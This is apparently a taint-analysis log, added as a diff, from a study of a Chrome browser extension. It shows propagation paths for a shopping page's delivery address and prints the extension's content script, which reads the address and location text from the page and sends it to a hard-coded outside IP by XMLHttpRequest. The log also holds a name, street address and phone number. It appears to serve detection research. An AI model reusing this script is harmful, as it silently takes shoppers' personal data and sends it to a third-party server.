@@ -1,0 +1,53 @@
+** Propagation paths: 
+
+0xe07fbfc7591: [String]: uc"Erin Lee\x0a27 A ST SW\x0aJACKSONVILLE, AL 36265-2402\x0aUnited States\x0aPhone number: \u202a+1 470 253 1212\u202c\x0aAdd delivery instructions_end"
+:
+  0x10ff8a607881: [String] in OldSpace: ue"Erin Lee\x0a27 A ST SW\x0aJACKSONVILLE, AL 36265-2402\x0aUnited States\x0aPhone number: \u202a+1 470 253 1212\u202c\x0aAdd delivery instructions"
+, in function 31166721205009 ``: 0, 550
+
+0x10ff8a607881: [String] in OldSpace: ue"Erin Lee\x0a27 A ST SW\x0aJACKSONVILLE, AL 36265-2402\x0aUnited States\x0aPhone number: \u202a+1 470 253 1212\u202c\x0aAdd delivery instructions"
+:
+
+
+** Taint source objects:
+
+
+** Propagation path functions: 
+
+0x1c589158a311 <JSFunction (sfi = 0x1c5891589839)> ``: 0
+console.log("start content-script mv2");
+let tainted_str = document.getElementsByClassName("a-box-inner a-padding-none")[1]
+    .innerText;
+
+let taint_post = document.getElementById("glow-ingress-block").innerText;
+var port = chrome.runtime.connect({name: "knock"});
+
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://45.79.219.209", true);
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == 4) {
+
+    }
+}
+encoder = new TextEncoder();
+console.log(taint_post);
+xhr.send(encoder.encode(taint_post).buffer);
+
+
+port.postMessage({tstr: tainted_str + "_end"});
+console.log("taint_str="+tainted_str);
+console.log("taint_url="+document.location.href);
+
+
+port.onMessage.addListener(function(msg) {
+    console.log("back str"+msg.backstr);
+    chrome.storage.local.set({ key: msg.backstr }, function(){
+    console.log("key is set to: " + msg.backstr);
+    });
+});
+
+
+
+** Taint source functions: 
+
+
